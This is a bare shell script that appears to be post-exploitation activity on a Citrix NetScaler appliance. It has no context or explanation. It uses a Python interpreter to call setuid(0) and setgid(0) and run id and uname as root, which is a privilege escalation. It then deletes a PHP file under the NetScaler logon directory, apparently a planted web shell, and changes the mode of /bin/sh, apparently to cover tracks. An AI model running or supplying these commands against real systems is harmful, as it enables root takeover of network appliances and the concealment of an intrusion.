echo "id:"
/var/python/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.execv("/usr/bin/id", ["/usr/bin/id"])'
echo "uname -a:"
/var/python/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.execv("/usr/bin/uname", ["/usr/bin/uname", "-a"])'
rm /var/netscaler/logon/a.php
chmod 555 /bin/sh
